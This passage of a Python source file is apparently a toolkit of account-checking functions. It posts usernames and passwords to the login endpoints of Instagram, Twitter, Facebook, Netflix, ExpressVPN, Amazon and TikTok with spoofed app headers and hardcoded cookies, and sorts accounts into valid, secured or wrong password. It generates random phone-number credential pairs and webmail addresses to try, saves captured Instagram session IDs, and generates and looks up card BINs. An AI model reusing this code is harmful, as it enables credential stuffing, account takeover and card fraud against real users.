                id = idd.split(')')[0]
                follow_list.append(id)

            return follow_list

        except:
            return {'The resulting': 'False', 'login': 'False'}

    def login_instagram(username,password):
        URL_INSTA = 'https://i.instagram.com/api/v1/accounts/login/'
        HEADERS_INSTA = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        DATA_INSTA = {'uuid': uid,'password': password,'username': username,'device_id': uid,'from_reg': 'false','_csrftoken': 'missing','login_attempt_countn': '0'}
        RESPON = requests.post(URL_INSTA,headers=HEADERS_INSTA,data=DATA_INSTA).text
        if ('logged_in_user') in RESPON:
            data = {
            'username':username,
            'password':password,
            'The resulting':'True',
            }
            return data
        elif ('check your username') in RESPON:
            data = {
            'username':username,
            'password':password,
            'The resulting':'Band username',
            }
            return data
        elif ('challenge_required') in RESPON:
            data = {
            'username':username,
            'password':password,
            'The resulting':'Secure',
            }
            return data
        elif ('Please wait a few minutes') in RESPON:
            data = {
            'username':username,
            'password':password,
            'The resulting':'block ip',
            }
            return "block ip"
        else:
            data = {
            'username':username,
            'password':password,
            'The resulting':'False password',
            }
            return data
    def login_twitter(username,password):
        URL_TWITTER = 'https://twitter.com/sessions'
        HEADERS_TWITTER={
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
     
		'Accept-Encoding': 'gzip, deflate, br',
		
        'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
		
        'Content-Length': '901',
		
        'Content-Type': 'application/x-www-form-urlencoded',
		
        'Cookie': 'personalization_id="v1_aFGvGiam7jnp1ks4ml5SUg=="; guest_id=v1%3A161776685629025416; gt=1379640315083112449; ct0=de4b75112a3f496676a1b2eb0c95ef65; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCIA8a6p4AToMY3NyZl9p%250AZCIlM2RlMDA1MzYyNmJiMGQwYzQ1OGU2MjFhODY5ZGU5N2Y6B2lkIiU4ODM0%250AMjM5OTNlYjg0ZGExNzRiYTEwMWE0M2ZhYTM0Mw%253D%253D--f5b0bce9df3870f1a221ae914e684fbdc533d03d; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _mb_tk=10908ac0975311eb868c135992f7d397',
		
        'Host': 'twitter.com',
		
        'Origin': 'https://twitter.com',
		
        'Referer': 'https://twitter.com/login?lang=ar',
		
        'TE': 'Trailers',
		
        'Upgrade-Insecure-Requests': '1',
		
        'User-Agent': generate_user_agent()}
        DATA_TWITTER={
        'redirect_after_login': '/',
		
        'remember_me': '1',
		
        'authenticity_token': '10908ac0975311eb868c135992f7d397',
		
        'wfa': '1',
		
        'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
		
        'session[username_or_email]': username,
		
        'session[password]': password}
        RESPON = requests.post(URL_TWITTER,headers=HEADERS_TWITTER,data=DATA_TWITTER)
        if ("ct0") in RESPON.cookies:
            data =  {'username':username,'password':password,'The resulting':'True'}
            return data
        else:
            data =  {'username':username,'password':password,'The resulting':'False password'}
            return data
            
    def login_facebook(username,password):
        GET = random.randint(20000.0, 40000.0)
        URL_FACEBOOK = 'https://b-api.facebook.com/method/auth.login'
        HEADERS_FACEBOOK = {
                    'x-fb-connection-bandwidth': repr(GET), 
                    'x-fb-sim-hni': repr(GET), 
                    'x-fb-net-hni': repr(GET), 
                    'x-fb-connection-quality': 'EXCELLENT', 
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
                    'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188828013;FBCR/Advance Info Service;FBMF/samsung;FBDV/SM-N950N;FBSV/5.1.1;FBCA/x86;armeabi-v7a;FBDM{density=2.0,width=900,height=1600};FB_FW;FBRV/0;]', 
                    'content-type': 'application/x-www-form-urlencoded', 
                    'x-fb-http-engine': 'Liger'}
        PARAMS_FACEBOOK = {
                   'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                   'format': 'JSON',
                   'sdk_version': '2',
                   'email': username,
                   'locale': 'en_US',
                   'password': password,
                   'sdk': 'ios',
                   'generate_session_cookies': '1',
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',}
        RESPON =requests.get(URL_FACEBOOK, params=PARAMS_FACEBOOK, headers=HEADERS_FACEBOOK).text
        if str("EAA") in str(RESPON):
            data =  {'username':username,'password':password,'The resulting':'True'}
            return data
        elif str("www.facebook.com") in RESPON:
            data =  {'username':username,'password':password,'The resulting':'Secure'}
            return data
        else:
            data =  {'username':username,'password':password,'The resulting':'False password'}
            return data

    def login_netflix(email: str, password: str) -> str:
        email = str(email)
        domin = email.split('@')[1]
        url = 'https://ios.prod.http1.netflix.com/iosui/user/10.19'
        headers = {
            "Host": "ios.prod.http1.netflix.com",
            "Cookie": "flwssn=74266376-523d-48c3-9bc3-8a009e804a37; memclid=TkZBUFBMLTAyLUlQSE9ORTk9NC1ENUJBN0IxQTAyNTI0NTM2OEQ0QUEzMjNFOTg3NDMzQzUyQzZGQjRCNjczRTg1NjIxRUEzMDFENDQ0RUM3OEIx; nfvdid=BQFmAAEBENN4QjtTnSS8VW_4WDVPc45gbv8HGuY3dcUdp9_6Xb6d_vcJbqU4lp2n8cm8kaOYxAGr7OI5JciXNkgH-zvKmtkUQcWfMkOj3TvuMtezrkns7ZtQcfAcFOutfzGV9LhYM1QKbizWrz0uHkFoHMVbhNYl",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Netflix.argo.abtests": "",
            "X-Netflix.client.appversion": "10.19.0",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "ar-US;q=1, en-US;q=0.9",
            "Content-Length": "1851",
            "X-Netflix.client.idiom": "phone",
            "User-Agent": str(generate_user_agent()),
            "X-Netflix.client.type": "argo",
            "X-Netflix.nfnsm": "9",
            "Connection": "close"}
        data = f'appInternalVersion=10.19.0&appVersion=10.19.0&callPath=%5B%22moneyball%22%2C%22appleSignUp%22%2C%22next%22%5D&config=%7B%22useSecureImages%22%3Atrue%2C%22volatileBillboardEnabled%22%3A%22false%22%2C%22kidsTrailers%22%3Atrue%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22interactiveFeaturePIBEnabled%22%3A%22true%22%2C%22showMoreDirectors%22%3Atrue%2C%22roarEnabled%22%3A%22true%22%2C%22warmerHasGenres%22%3Atrue%2C%22aroGalleriesEnabled%22%3A%22false%22%2C%22verticalBillboardEnabled%22%3A%22true%22%2C%22previewsRowEnabled%22%3A%22true%22%2C%22contentRefreshEnabled%22%3A%22false%22%2C%22interactiveFeatureStretchBreakoutEnabled%22%3A%22true%22%2C%22interactiveFeatureBuddyEnabled%22%3A%22true%22%2C%22interactiveFeatureAlexaAndKatieCharacterEnabled%22%3A%229.57.0%22%2C%22titleCapabilityFlattenedShowEnabled%22%3A%22true%22%2C%22kidsMyListEnabled%22%3A%22true%22%2C%22billboardEnabled%22%3A%22true%22%2C%22interactiveFeatureBadgeIconTestEnabled%22%3A%229.57.0%22%2C%22shortformRowEnabled%22%3A%22false%22%2C%22kidsUIOnPhone%22%3Afalse%2C%22contentWarningEnabled%22%3A%22true%22%2C%22billboardPredictionEnabled%22%3A%22false%22%2C%22billboardKidsTrailerEnabled%22%3A%22false%22%2C%22billboardTrailerEnabled%22%3A%22false%22%2C%22bigRowEnabled%22%3A%22true%22%7D&device_type=NFAPPL-02-&esn=NFAPPL-02-IPHONE9%3D4-D5BA7B1A025245368D4AA323E987433C52C6FB4B673E85621EA301D444EC78B1&idiom=phone&iosVersion=14.3&isTablet=false&kids=false&maxDeviceWidth=414&method=call&model=saget&modelType=IPHONE9-4&odpAware=true&param=%7B%22action%22%3A%22loginAction%22%2C%22fields%22%3A%7B%22email%22%3A%22{email}%40{domin}%22%2C%22rememberMe%22%3A%22true%22%2C%22password%22%3A%22{password}%22%7D%2C%22verb%22%3A%22POST%22%2C%22mode%22%3A%22login%22%2C%22flow%22%3A%22appleSignUp%22%7D&pathFormat=graph&pixelDensity=3.0&progressive=false&responseFormat=json'
        r = requests.session()
        # proxies = {'http':proxy,'https':
        res = r.post(url, headers=headers, data=data ,proxies=urllib.request.getproxies() ,allow_redirects=False,verify=False).text
        if '"memberHome"' in res:
            return {'email_username': str(email), 'password': str(password), 'The resulting' :'True'}

        elif '"incorrect_password"' in res:
            return {'email_username': str(email), 'password': str(password), 'The resulting' :'False Password'}
            
        elif 'never_member_consumption_only' in res:
            return {'email_username': str(email), 'password': str(password), 'The resulting' :'Free Netflix'}
        elif 'unrecognized_email' in res:
            return {'email_username': str(email), 'password': str(password), 'The resulting' :'False Email'}
        else:
            return {'email_username': str(email), 'password': str(password), 'The resulting' :'Blocked'}
    def pubg_twitter(username: str, password: str) -> str:
        token_l = 'https://api.twitter.com/1.1/guest/activate.json'

        t = {
            'User-Agent': 'TwitterAndroid/8.87.0-release.01 (28870001-r-1) SM-G935F/7.1.2 (samsung;SM-G935F;samsung;SM-G935F;0;;1;2012)',
            'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F' ,}
        token = requests.post(token_l ,headers=t).json()['guest_token']
        url = "https://api.twitter.com/auth/1/xauth_password.json"
        headers = {
            'Cache-Control': 'no-store',
            'X-B3-TraceId': 'bc35545e2885cf69',
            'OS-Security-Patch-Level': '2017-10-05',
            'X-Twitter-Client-Flavor': '',
            'User-Agent': 'TwitterAndroid/8.87.0-release.01 (28870001-r-1) SM-G935F/7.1.2 (samsung;SM-G935F;samsung;SM-G935F;0;;1;2012)',
            'Accept-Encoding': 'gzip, deflate',
            'X-Twitter-Client-AdID': '143f8c1d-0dab-495e-bdba-6b8f3216d92f',
            'Timezone': 'Asia/Shanghai',
            'X-Twitter-Client-Limit-Ad-Tracking': '0',
            'X-Twitter-Client-DeviceID': 'c0575264c704f9c6',
            'X-Twitter-Client': 'TwitterAndroid',
            'X-Twitter-Client-Language': 'ar-EG',
            'X-Twitter-API-Version': '5',
            'att': '1-p8YDwE1eClUMxxzR8MHgZpnUFyhpILYjFUzExuRI',
            'Optimize-Body': 'true',
            'X-Twitter-Active-User': 'yes',
            'X-Twitter-Client-Version': '8.87.0-release.01',
            'X-Guest-Token': str(token),
            'X-Client-UUID': 'f55fe15f-b1f4-4406-9dd7-e0eb18b841ec',
            'Accept': 'application/json',
            'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F',
            'Accept-Language': 'ar-EG',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': '140',
            'Host': 'api.twitter.com',
            'Connection': 'close',
            'Cookie': 'personalization_id=v1_PV0kGHiFp5r175R1KzBEzg==; guest_id=v1%3A161752602861069129'
        }
        data = {
            'x_auth_identifier': username,
            'x_auth_password': password,
            'send_error_codes' :'true',
            'x_auth_login_challenge' :'1',
            'x_auth_login_verification' :'1',
            'ui_metrics': ''}
        login = requests.post(url ,headers=headers ,data=data).text
        if 'oauth_token' in login:
            return {'username': str(username), 'password': str(password), 'The resulting' :'True'}
        else:
            return {'username': str(username), 'password': str(password), 'The resulting' :'False'}
    def login_express(email: str ,password: str) -> str:
        url = "https://www.expressvpn.com/sessions"
        headers = {
            'accept' :'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding' :'gzip, deflate, br',
            'accept-language' :'en-GB,en;q=0.9,en-US;q=0.8',
            'cache-control' :'max-age=0',
            'content-length' :'230',
            'content-type' :'application/x-www-form-urlencoded',
            'cookie' :'xvid=EG-to2YQ4i8JNF4aOKfmzKoVEq_zYc4fa4PkC1scPp4%3D; xvsrcdirect=1; xv_ab=%7B%22be4803_202203_braintree_paypal%22%3A%22be4803_202203_control%22%2C%22webco392_202203_billing_info_winner%22%3A%22webco392_202203_billing_info_variant%22%7D; xvgtm=%7B%22location%22%3A%22EG%22%2C%22logged_in%22%3Afalse%2C%22report_aid_to_ga%22%3Afalse%7D; landing_page=https://www.expressvpn.net/order; _gcl_au=1.1.272875252.1650364637; _clck=waj5qh|1|f0r|0; _gid=GA1.2.1325101230.1650364657; SnapABugRef=https%3A%2F%2Fwww.expressvpn.net%2Forder%20; SnapABugHistory=1#; forterToken=8d15223a3a1e44638004714a9704f258_1650364657385__UDF43_13ck; _fbp=fb.1.1650364658200.1265141463; xvsrcwebsite=www.expressvpn.net; locale=; _gat_UA-8164236-1=1; _xv_web_frontend_session=N0FhSkVLc1dCbEQ2clpjOG9DVEhpM3VWWFJDZW5kcWNKWFQvcVlQK1VISnNvZVZ3T2ZiamtReFJzYnNsbHZOOVVEZWhrSVBaeFpLOVJEeUk1cXNNZlNBRVhSTlNJMEl2b3ZqbmhYMkRqWm5ZMHhtZktrUlhKKzViZ0xSN3Y1dWVOYnRLdWh5R1JJbnpmMis0akQzVUNtWEd3ZXpFaldjUjRON24zUlZSa01RcFJ1VXg1TUhSc2RUWU1renFFQTQrU1lyODV1S0FETDVuNFJNY0NNUWkrbmJ4bnE4WVU0Vk9iSDhLSit0VjNuMit1c3R5T1lwRkFLMmwrUDlPaUxTNC0tRC9IT0ZsdUtET3l6RmNYZytCTVpOZz09--6dee6293e618e7d7fdaa2e416be6e309561e5bed; _ga_ZDM0C7DHZZ=GS1.1.1650364636.1.1.1650364680.16; SnapABugUserAlias=%23; SnapABugVisit=3#1650364658; _ga=GA1.1.1704802388.1650364637; _uetsid=bb1bd490bfcc11ecbf747b496145ae3e; _uetvid=bb1c0730bfcc11ecb901417b6b179450; _clsk=asx9jg|1650364682051|3|1|e.clarity.ms/collect',
            'dnt' :'1',
            'origin' :'https://www.expressvpn.net',
            'referer' :'https://www.expressvpn.net/sign-in',
            'sec-ch-ua' :'"Not A;Brand";v="99", "Chromium";v="100", "Microsoft Edge";v="100"',
            'sec-ch-ua-mobile' :'?0',
            'sec-ch-ua-platform' :'"Windows"',
            'sec-fetch-dest' :'document',
            'sec-fetch-mode' :'navigate',
            'sec-fetch-site' :'same-origin',
            'sec-fetch-user' :'?1',
            'upgrade-insecure-requests' :'1',
            'user-agent' :str(generate_user_agent()) ,}
        data = {
            'utf-8' :'✓',
            'authenticity_token' :'SgVUhccIQKFh/FlqFfTTUErtcAq9oG5hJgX5InEE7eg+Ep9reGOkiRIsvDyo+2tTphNLWW6PdGnsp248zVPMkA==',
            'location_fragment' :'',
            'redirect_path' :'',
            'email' :str(email),
            'password' :str(password),
            'commit' :'Sign In' ,}
        req = requests.post(url ,headers=headers ,data=data).text
        if ("Verification Needed") in req:
            return {'email_username': str(email), 'password': str(password), 'The resulting' :'False'}
        else:
            return {'email_username': str(email), 'password': str(password), 'The resulting' :'True'}
    def login_amazon(email: str, password: str) -> str:
        url = "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue"
        headers = {'User-agent': str(generate_user_agent())}
        se = requests.session()
        data = {'customerName': 'The Jordan Ghost', 'email': str(email), 'password': str(password),
                'passwordCheck': str(password)}
        res = se.post(url, headers=headers, data=data).text
        if "You indicated you are a new customer, but an account already exists with the e-mail" in res:
            return {'email_username': str(email), 'password': str(password), 'The resulting' :'False'}
        else:  
            return {'email_username': str(email), 'password': str(password), 'The resulting': 'True'}
    def get_tiktok_sessionid(username: str, password: str) -> str:
        url = 'https://api2.musical.ly/passport/user/login/?mix_mode=1&username=1&email=&mobile=&account=&password=hg&captcha=&ts=&app_type=normal&app_language=en&manifest_version_code=2018073102&_rticket=1633593458298&iid=7011916372695598854&channel=googleplay&language=en&fp=&device_type=SM-G955F&resolution=1440*2792&openudid=91cac57ba8ef12b6&update_version_code=2018073102&sys_region=AS&os_api=28&is_my_cn=0&timezone_name=Asia/Muscat&dpi=560&carrier_region=OM&ac=wifi&device_id=6785177577851504133&mcc_mnc=42203&timezone_offset=14400&os_version=9&version_code=800&carrier_region_v2=422&app_name=musical_ly&version_name=8.0.0&device_brand=samsung&ssmix=a&build_number=8.0.0&device_platform=android&region=US&aid=&as=&cp=Qm&mas='
        headers = \
            {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
            'cookie': 'csrftoken=' + str(secrets.token_hex(8) * 2) + '; sessionid=' + str(secrets.token_hex(8) * 2) + ';',
            'User-Agent': 'Connectionzucom.zhiliaoapp.musically/2018073102 (Linux; U; Android 9; en_AS; SM-G955F; Build/PPR1.180610.011; Cronet/58.0.2991.0)z',
            'Host': 'api2.musical.ly', 'Connection': 'keep-alive'}
        data = {"email": str(username), "password": str(password)}
        res = requests.post(url, headers=headers, data=data)
        if ("user_id") in res.text:
            sessionid = str(res.json()['data']['session_key'])
            return {'username': str(username), 'password': str(password), 'The resulting': 'True', 'SessionId': sessionid}

        elif ("Incorrect account or password") in res.text:
            {'username': str(username), 'password': str(password), 'The resulting' :'Error Password Or Username'}
        else:
            {'username': str(usermame), 'password': str(password), 'The resulting' :'False'}
    def headers(header: str) -> str:
        try:
            header = str(header)
            a1 = header.split(': ')[0]
            a2 = header.split(': ')[1]
            headere = "'" + a1 + "':'" + a2 + "',"
            return headere
        except IndexError:
            return False
    def info_instagram(username):
    	 try:
	        resp = requests.get(f"https://mr-abood.herokuapp.com/Instagram/Info?User={username}").json()['results']
	        name = resp['name']
	        post = resp['Posts']
	        followers = resp['Followers']
	        following = resp['Following']
	        id = resp['id']
	        date = resp['created date']
	        return {'username': username, 'name': name, 'posts': post, 'followers': followers, 'following': following, 'id': id, 'date': date, 'The resulting': 'True'} 
    	 except:
	      return {'The resulting': 'False'} 
    def get_instagram_sessionid(email,password):
    		url = "https://i.instagram.com/api/v1/accounts/login/"
    		headers = {
    	 'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
        'Accept':'*/*', 
        'Cookie':'missing', 
        'Accept-Encoding':'gzip, deflate', 
        'Accept-Language':'en-US', 
        'X-IG-Capabilities':'3brTvw==', 
        'X-IG-Connection-Type':'WIFI', 
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
        'Host':'i.instagram.com'}
    		data = {
    	'uuid':str(uuid4()),
		'password':password,
		'username':email, 
		'device_id':str(uuid4()),
		'from_reg':'false', 
		'_csrftoken':'missing', 
		'login_attempt_countn':'0'}
    		login = requests.post(url,headers=headers,data=data,allow_redirects=True,verify=True)
    		if str("logged_in_user") in login.text:
    			os.system('rm -rf sessionid.txt')
    			APK = login.cookies['sessionid']	
    			f = open('sessionid.txt','a')
    			f.write(APK+"\n")
    			f.close()
    			return {'email_username': email, 'password': password, 'sessionid': APK, 'The resulting': 'True'} 		
    		if str('"message":"challenge_required","challenge"') in login.text:
    			return {'email_username': email, 'password': password, 'The resulting': 'False'} 
    		else:
    			return {'email_username': email, 'password': password, 'The resulting': 'None'} 
    def login_tiktok(email: str, password: str) -> str:
        url = 'https://api2.musical.ly/passport/user/login/?mix_mode=1&username=1&email=&mobile=&account=&password=hg&captcha=&ts=&app_type=normal&app_language=en&manifest_version_code=2018073102&_rticket=1633593458298&iid=7011916372695598854&channel=googleplay&language=en&fp=&device_type=SM-G955F&resolution=1440*2792&openudid=91cac57ba8ef12b6&update_version_code=2018073102&sys_region=AS&os_api=28&is_my_cn=0&timezone_name=Asia/Muscat&dpi=560&carrier_region=OM&ac=wifi&device_id=6785177577851504133&mcc_mnc=42203&timezone_offset=14400&os_version=9&version_code=800&carrier_region_v2=422&app_name=musical_ly&version_name=8.0.0&device_brand=samsung&ssmix=a&build_number=8.0.0&device_platform=android&region=US&aid=&as=&cp=Qm&mas='
        headers = \
            {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
            'cookie': 'csrftoken={secrets.token_hex(8)*2}; sessionid={secrets.token_hex(8)*2};',
            'User-Agent': 'Connectionzucom.zhiliaoapp.musically/2018073102 (Linux; U; Android 9; en_AS; SM-G955F; Build/PPR1.180610.011; Cronet/58.0.2991.0)z',
            'Host': 'api2.musical.ly', 'Connection': 'keep-alive'}
        data = {"email": email, "password": password}
        res = requests.post(url, data=data, headers=headers).text
        if ("user_id") in res:
            return {'email_username': email, 'password': password, 'The resulting': 'True'} 		
        else:
            return {'email_username': email, 'password': password, 'The resulting': 'False'} 		
    def get_user_pass_iraq():
        NAM = "12345678900"
        GET = str(''.join((random.choice(NAM) for i in range(8))))
        ACOONT = ("+96477"+GET+':'+"077"+GET)
        return ACOONT
        
    def get_user_pass_iran():
        NAM = "1234567890"
        GET = str(''.join((random.choice(NAM) for i in range(7))))
        ACOONT = ("+98919"+GET+':'+"0919"+GET)
        return ACOONT
    def get_email_gmail():
        NAM = "1234567890"
        GET = str(''.join((random.choice(NAM) for i in range(4))))
        NAME = names.get_first_name()
        email = (NAME+GET+"@gmail.com")
        return email
            
    def get_email_yahoo():
        NAM = "1234567890"
        GET = str(''.join((random.choice(NAM) for i in range(4))))
        NAME = names.get_first_name()
        email = (NAME+GET+"@yahoo.com")
        return email
        
    def user_agent():
        us = generate_user_agent() 
        return us
        
    def get_email_hotmail():
        NAM = "1234567890"
        GET = str(''.join((random.choice(NAM) for i in range(4))))
        NAME = names.get_first_name()
        email = (NAME+GET+"@hotmail.com")
        return email
    def get_email_outlook():
        NAM = "1234567890"
        GET = str(''.join((random.choice(NAM) for i in range(4))))
        NAME = names.get_first_name()
        email = (NAME+GET+"@outlook.com")
        return email
    def make_bin():  	
	    d = ('1234567890')
	    f = random.choice(d)
	    g = random.choice(d)
	    haa = random.choice(d)
	    has = random.choice(d)
	    star = (f'48{f}{g}{haa}{has}')
	    return star
    def check_bin(bin):
	    re = requests.get(f'http://MrAbood3.Pythonanywhere.com/Bin/Api?bin={bin}').json()
	    status = re["status"]
	    if str(status) == "True":
	      brand = re["brand"]
	      type = re["type"]
	      scheme = re["scheme"]
	      country_name = re["country"]["name"]
	      country_flag = re["country"]["flag"]
	      country_abbreviation = re["country"]["abbreviation"]
	      country_currency = re["country"]["currency"]
	      country_latitude = re["country"]["latitude"]
	      country_longitude = re["country"]["longitude"]
	      bank_name = re["bank"]["name"]
	      bank_url = re["bank"]["url"]
	      bank_phone = re["bank"]["phone"]
	      return {'bin': bin, 'scheme': scheme, 'type': type, 'brand': brand, 'Country Name': country_name, 'Country Flag': country_flag, 'Country Abbreviation': country_abbreviation, 'Country Currency': country_currency, 'Country Latitude': country_latitude, 'Country Longitude': country_longitude, 'Bank Name': bank_name, 'Bank Url': bank_url, 'Bank Phone': bank_phone}
    def Check_users_Telegram(user):
        ree = requests.get(f"https://t.me/{user}").text
        jd = f'Available'
        jk = f'NOT Available'
        if 'tgme_username_link' in ree:
        	return {'user': user, 'The resulting': jd}
        else:
        	return {'user': user, 'The resulting': jk}
    def make_users():
    	oip = 'qwertyuioplkjhgfdsazxcvbnm'
    	upper = 'ABCDEFGHIKLMNOPQSTVWSYZ'
    	number = '0987654321'
    	uu7 = '_'
    	all = number + upper + oip
    	length = 1
    	u = ''.join(random.sample(all, length))
    	s = ''.join(random.sample(all, length))
    	r = ''.join(random.sample(all, length))
    	kk = u + '_' + s + '_' + r
    	return kk
    	
    def get_ip_info(ip : str) -> str:
    	url = "http://ip-api.com/json/{0}"
    	resp = requests.get(url.format(ip)).json()
    	country = resp["country"]
    	countryCode = resp["countryCode"]
    	region = resp["region"]
    	regionName = resp["regionName"]
    	city = resp["city"]
    	zip = resp["zip"]
    	lat = resp["lat"]
    	lon = resp["lon"]
    	timezone = resp["timezone"]
    	isp = resp["isp"]
    	org = resp["org"]
    	ass = resp["as"]
    	our_ip = geocoder.ip(ip)
    	location = our_ip.latlng
    	return {'ip': ip,'country': country,'country code': countryCode,'region': region, 'region name': regionName, 'city' : city, 'zip' : zip, 'lat' : lat, 'lon' : lon, 'timezone' : timezone, 'isp' : isp, 'org': org, 'as': ass, 'location': location}